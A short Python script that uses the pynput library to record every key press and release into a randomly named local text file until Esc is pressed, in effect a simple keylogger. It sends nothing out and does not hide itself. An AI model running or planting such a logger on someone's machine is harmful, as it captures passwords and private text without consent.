from random import randint

# PYNPUT library allows you to control and monitor input devices...
# currently, mouse and keyboard input and monitoring are supported.

from pynput.keyboard import Key, Listener

# define the output file name with a mix if random string to evict multiple naming convention
output_file_name = 'kld_' + str(randint(0, 100000)) + '.txt'

# initiate the output file
with open(output_file_name, 'w') as f:
    f.close()


def on_press(key):
    with open(output_file_name, 'a') as f:
        f.write('{0} pressed\n'.format(key))
        f.close()


def on_release(key):
    with open(output_file_name, 'a') as f:
        f.write('{0} released\n'.format(key))
        f.close()
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
